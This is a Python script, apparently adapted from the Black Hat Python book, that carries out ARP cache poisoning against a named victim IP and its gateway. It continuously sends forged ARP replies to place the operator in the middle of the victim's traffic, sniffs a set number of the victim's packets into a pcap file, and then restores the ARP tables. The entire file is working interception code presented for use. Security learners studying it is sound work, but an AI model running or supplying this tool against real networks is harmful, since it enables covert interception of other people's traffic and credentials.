# -*-coding:Utf-8 -*

"""
This is an arp poisoning tool from BHP book.

Improvement done:
- add argparse to manage arguments
- add parameter for output file
- move output file default path to user home

Improvement to do:
- display to improve
"""
from multiprocessing import Process
from scapy.all import ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap

import argparse
import os
import sys
import time


def manageArguments() -> argparse.Namespace:
    """
    Function to parse arguments
    :return: a parse_args object
    """
    if os.name == 'nt':
        homePath = os.environ["USERPROFILE"]+'\\\\'
    else:
        homePath = os.environ["HOME"] + '/'
    defaultFile = homePath+'packet.pcap'
    parser = argparse.ArgumentParser(
        description='BHP ARP poisoner.\n Need root or administrator right.',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='Example: python3 proxy.py -v 192.168.0.55 -g 192.168.0.254 -n eth0 -o /root/packet.pcap -c 100\n')
    parser.add_argument('-v', '--victim', required=True, help='The victim IP.')
    parser.add_argument('-g', '--gateway', required=True, help='The gateway IP of the victim.')
    parser.add_argument('-n', '--nic', required=True, help='The nic with access to the victim and gateway network.')
    parser.add_argument('-o', '--output', default=defaultFile, help='The file where packet are saved.')
    parser.add_argument('-c', '--count', default=200, help='The number of packet to capture.')
    return parser.parse_args()


def get_mac(targetip):
    packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=targetip)
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
    for _, r in resp:
        return r[Ether].src


class Arper:
    def __init__(self, victim, gateway, file, interface, count=200):
        self.victim = victim
        self.victimmac = get_mac(victim)
        self.gateway = gateway
        self.gatewaymac = get_mac(gateway)
        self.interface = interface
        self.file = file
        self.count = count
        conf.iface = self.interface
        conf.verb = 0
        print(f'Initialized {self.interface}:')
        print(f'\tGateway ({self.gateway} is at {self.gatewaymac}.')
        print(f'\tVictim ({self.victim}.')
        print('-'*30)
        self.poison_thread = Process(target=self.poison)
        self.sniff_thread = Process(target=self.sniff)

    def run(self):
        self.poison_thread.start()
        self.sniff_thread.start()

    def poison(self):
        poison_victim = ARP()
        poison_victim.op = 2
        poison_victim.psrc = self.gateway
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.victimmac
        print(f'ip src:\t{poison_victim.psrc}')
        print(f'mac src:\t{poison_victim.hwsrc}')
        print(f'ip dst: {poison_victim.pdst}')
        print(f'mac dst:\t{poison_victim.hwdst}')
        print(poison_victim.summary())
        print('-'*30)
        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = self.victim
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.gatewaymac
        print(f'ip src:\t{poison_gateway.psrc}')
        print(f'mac src:\t{poison_gateway.hwsrc}')
        print(f'ip dst: {poison_gateway.pdst}')
        print(f'mac dst:\t{poison_gateway.hwdst}')
        print(poison_gateway.summary())
        print('-' * 30)
        print(f'Beginning the ARP poison. [CTRL-C to stop]')
        while True:
            sys.stdout.write('.')
            sys.stdout.flush()
            try:
                send(poison_victim)
                send(poison_gateway)
            except KeyboardInterrupt:
                print("Interruption requested by user.")
                self.restore()
                time.sleep(5)
                exit(0)

    def sniff(self):
        time.sleep(5)
        print(f'Sniffing {self.count} packets.')
        bpf_filter = f"ip host {self.victim}"
        packets = sniff(count=self.count, filter=bpf_filter, iface=self.interface)
        wrpcap(self.file, packets)
        print('Got the packets!')
        self.restore()
        self.poison_thread.terminate()
        print('Finished!')

    def restore(self):
        print('Restoring ARP tables...')
        send(ARP(
            op=2,
            psrc=self.gateway,
            hwsrc=self.gatewaymac,
            pdst=self.victim,
            hwdst='ff:ff:ff:ff:ff:ff'),
            count=5
        )
        send(ARP(
            op=2,
            psrc=self.victim,
            hwsrc=self.victimmac,
            pdst=self.gateway,
            hwdst='ff:ff:ff:ff:ff:ff'),
            count=5
        )


def main():
    myArgs = manageArguments()
    try:
        myArp = Arper(myArgs.victim, myArgs.gateway, myArgs.output, myArgs.nic, myArgs.count)
        myArp.run()
    except PermissionError:
        print(f'We need root or administrator account on local machine to run this script!')
        exit(1)


if __name__ == '__main__':
    main()
